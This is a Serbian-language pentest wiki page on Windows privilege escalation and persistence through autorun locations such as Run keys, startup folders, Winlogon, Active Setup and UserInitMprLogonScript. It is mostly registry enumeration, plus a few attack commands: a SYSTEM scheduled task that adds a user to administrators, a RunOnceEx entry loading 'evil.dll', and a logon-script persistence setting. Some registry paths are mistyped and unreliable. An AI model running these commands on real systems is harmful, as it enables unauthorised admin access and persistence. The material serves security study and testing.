# Eskalacija privilegija pomoću Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** se može koristiti za pokretanje programa pri **pokretanju sistema**. Proverite koje su binarne datoteke podešene za pokretanje pri pokretanju sistema pomoću:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zakazani zadaci

**Zadaci** mogu biti zakazani za pokretanje sa **određenom učestalošću**. Koristite sledeće komande da biste videli koji binarni fajlovi su zakazani za pokretanje:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Fascikle

Svi binarni fajlovi koji se nalaze u **Startup fasciklama izvršavaju se pri pokretanju sistema**. Uobičajene Startup fascikle navedene su u nastavku, ali Startup fascikla je navedena u registry-ju. [Pročitajte ovo da biste saznali gde.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **NAPOMENA**: Ranljivosti *path traversal* pri ekstrakciji arhiva (kao što je ona koja je zloupotrebljena u WinRAR-u pre verzije 7.13 – CVE-2025-8088) mogu se iskoristiti za **direktno postavljanje payload-a u ove Startup foldere tokom dekompresije**, što dovodi do izvršavanja koda pri sledećem prijavljivanju korisnika. Za detaljnu analizu ove tehnike pogledajte:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registar

> [!TIP]
> [Napomena odavde](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Unos registra **Wow6432Node** označava da koristite 64-bitnu verziju Windows-a. Operativni sistem koristi ovaj ključ za prikaz zasebnog prikaza HKEY_LOCAL_MACHINE\SOFTWARE za 32-bitne aplikacije koje rade na 64-bitnim verzijama Windows-a.

### Runs

**Uobičajeno poznati** AutoRun registar:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Ključevi registra poznati kao **Run** i **RunOnce** namenjeni su automatskom izvršavanju programa svaki put kada se korisnik prijavi na sistem. Dužina komandne linije dodeljene kao vrednost podataka ključa ograničena je na najviše 260 znakova.<sup>[[2]](#references)</sup>

**Service runs** (mogu kontrolisati automatsko pokretanje servisa tokom pokretanja sistema):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Na Windows Vista i novijim verzijama, ključevi registra **Run** i **RunOnce** ne generišu se automatski. Unosi u ovim ključevima mogu direktno pokretati programe ili navoditi programe kao zavisnosti. Na primer, za učitavanje DLL datoteke pri prijavljivanju može se koristiti ključ registra **RunOnceEx** zajedno sa ključem „Depend“. Ovo se demonstrira dodavanjem unosa u registar za izvršavanje datoteke „C:\temp\evil.dll“ tokom pokretanja sistema:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Ako možete da upisujete u bilo koji od pomenutih ključeva registra unutar **HKLM**, možete eskalirati privilegije kada se drugi korisnik prijavi.

> [!TIP]
> **Exploit 2**: Ako možete da prepišete bilo koji od navedenih binarnih fajlova u bilo kom od ključeva registra unutar **HKLM**, možete izmeniti taj binarni fajl dodavanjem backdoor-a kada se drugi korisnik prijavi i eskalirati privilegije.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Prečice postavljene u fasciklu **Startup** automatski će pokrenuti servise ili aplikacije tokom prijavljivanja korisnika ili ponovnog pokretanja sistema. Lokacija fascikle **Startup** definisana je u registru za opsege **Local Machine** i **Current User**. To znači da će svaka prečica dodata na ove određene lokacije **Startup** obezbediti pokretanje povezanog servisa ili programa nakon prijavljivanja ili ponovnog pokretanja, što predstavlja jednostavan način za zakazivanje automatskog pokretanja programa.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Ako možete da prepišete bilo koju fasciklu \[User] Shell Folder u okviru **HKLM**, moći ćete da je usmerite na fasciklu pod svojom kontrolom i postavite backdoor koji će se izvršavati svaki put kada se korisnik prijavi na sistem, čime se eskaliraju privilegije.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Ova registry vrednost po korisniku može upućivati na skriptu ili komandu koja se izvršava kada se taj korisnik prijavi. Uglavnom predstavlja **persistence** primitivu jer se izvršava samo u kontekstu pogođenog korisnika, ali je ipak vredi proveriti tokom post-exploitation i autoruns provera.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Ako možete da upisujete u ovu vrednost za trenutnog korisnika, možete ponovo pokrenuti izvršavanje pri sledećoj interaktivnoj prijavi bez potrebe za admin pravima. Ako možete da upisujete u hive drugog korisnika, možete dobiti code execution kada se taj korisnik prijavi.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Napomene:

- Dajte prednost punim putanjama do `.bat`, `.cmd`, `.ps1` ili drugih launcher fajlova kojima ciljni korisnik već može da pristupi.
- Ovo ostaje aktivno nakon odjavljivanja/ponovnog pokretanja sistema sve dok se vrednost ne ukloni.
- Za razliku od `HKLM\...\Run`, ovo samo po sebi **ne dodeljuje povišene privilegije**; to je persistence u opsegu korisnika.

### Winlogon ključevi

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Obično je ključ **Userinit** podešen na **userinit.exe**. Međutim, ako se ovaj ključ izmeni, navedeni executable će takođe pokrenuti **Winlogon** prilikom prijavljivanja korisnika. Slično tome, ključ **Shell** je namenjen da pokazuje na **explorer.exe**, koji je podrazumevani shell za Windows.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Ako možete da zamenite vrednost u registru ili binarnu datoteku, moći ćete da eskalirate privilegije.

### Podešavanja politika

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Proverite ključ **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Promena komandne linije u Safe Mode režimu

U Windows Registry-ju, pod `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, postoji vrednost **`AlternateShell`**, koja je podrazumevano postavljena na `cmd.exe`. To znači da se, kada tokom pokretanja izaberete „Safe Mode with Command Prompt“ (pritiskom na F8), koristi `cmd.exe`. Međutim, moguće je podesiti računar tako da se automatski pokrene u ovom režimu bez potrebe za pritiskanjem F8 i ručnim izborom opcije.

Koraci za kreiranje opcije pokretanja koja automatski pokreće „Safe Mode with Command Prompt“:<sup>[[5]](#references)</sup>

1. Promenite atribute datoteke `boot.ini` da biste uklonili oznake read-only, system i hidden: `attrib c:\boot.ini -r -s -h`
2. Otvorite `boot.ini` radi izmene.
3. Ubacite liniju poput: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Sačuvajte izmene u datoteci `boot.ini`.
5. Ponovo primenite originalne atribute datoteke: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Promena registry ključa **AlternateShell** omogućava podešavanje prilagođene komandne ljuske, što potencijalno može poslužiti za neovlašćen pristup.
- **Exploit 2 (PATH Write Permissions):** Dozvole za upis u bilo koji deo sistemske promenljive **PATH**, naročito pre `C:\Windows\system32`, omogućavaju izvršavanje prilagođenog `cmd.exe`, koji može predstavljati backdoor ako se sistem pokrene u Safe Mode režimu.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Dozvole za upis u `boot.ini` omogućavaju automatsko pokretanje Safe Mode režima, čime se olakšava neovlašćen pristup pri sledećem restartu.

Da biste proverili trenutnu postavku **AlternateShell**, koristite sledeće komande:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Instalirana komponenta

Active Setup je funkcija u Windows-u koja **se pokreće pre nego što se desktop okruženje u potpunosti učita**. Ona daje prioritet izvršavanju određenih komandi, koje moraju biti završene pre nego što se nastavi user logon. Ovaj proces se odvija čak i pre pokretanja drugih startup unosa, kao što su oni u registry odeljcima Run ili RunOnce.

Active Setup se upravlja pomoću sledećih registry ključeva:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Unutar ovih ključeva postoje različiti podključevi, od kojih svaki odgovara određenoj komponenti. Vrednosti ključeva od posebnog interesa uključuju:

- **IsInstalled:**
- `0` označava da se komanda komponente neće izvršiti.
- `1` znači da će se komanda izvršiti jednom za svakog user-a, što je podrazumevano ponašanje ako vrednost `IsInstalled` nedostaje.
- **StubPath:** Definiše komandu koju Active Setup treba da izvrši. To može biti bilo koja validna komandna linija, kao što je pokretanje programa `notepad`.

**Bezbednosne napomene:**

- Izmena ili upisivanje u ključ gde je **`IsInstalled`** postavljen na `"1"` sa određenim **`StubPath`** može dovesti do neovlašćenog izvršavanja komandi, što potencijalno omogućava privilege escalation.
- Izmena binarnog fajla na koji ukazuje bilo koja vrednost **`StubPath`** takođe može omogućiti privilege escalation, ukoliko postoje dovoljne dozvole.

Za pregled konfiguracija **`StubPath`** vrednosti u Active Setup komponentama mogu se koristiti sledeće komande:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Pregled Browser Helper Objects (BHO)

Browser Helper Objects (BHO) su DLL moduli koji dodaju dodatne funkcije Microsoft Internet Explorer-u. Učitavaju se u Internet Explorer i Windows Explorer pri svakom pokretanju. Međutim, njihovo izvršavanje može biti blokirano postavljanjem ključa **NoExplorer** na vrednost 1, čime se sprečava njihovo učitavanje sa instancama Windows Explorer-a.<sup>[[1]](#references)</sup>

BHO su kompatibilni sa Windows 10 preko Internet Explorer-a 11, ali nisu podržani u Microsoft Edge-u, podrazumevanom browser-u u novijim verzijama Windows-a.

Da biste pregledali BHO registrovane na sistemu, možete proveriti sledeće registry ključeve:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Svaki BHO je u registry-ju predstavljen svojim **CLSID**-om, koji služi kao jedinstveni identifikator. Detaljne informacije o svakom CLSID-u mogu se pronaći pod `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Za upite o BHO u registry-ju mogu se koristiti sledeće komande:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Ekstenzije Internet Explorer-a

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Imajte na umu da će registar sadržati 1 novi unos registra za svaki dll i da će biti predstavljen pomoću **CLSID**-a. Informacije o CLSID-u možete pronaći u `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Drajveri fontova

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Komanda Open

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opcije izvršavanja slikovnih datoteka
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Imajte na umu da su sve lokacije na kojima možete pronaći autoruns **već pretražene pomoću**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Međutim, za **sveobuhvatniji spisak automatski izvršenih** datoteka možete koristiti [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)iz systinternals-a:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Još

**Pronađite još Autoruns stavki poput registara u** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Uobičajeni mehanizmi persistence malware-a](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Automatsko izvršavanje pri pokretanju ili prijavljivanju: ključevi Registry Run / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Inicijalizacione skripte pri pokretanju ili prijavljivanju: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Kategorije automatskog pokretanja (Rešavanje problema pomoću Windows Sysinternals Tools, 2. izdanje)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Kako mogu da dodam opciju pokretanja koja pokreće alternativni shell?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
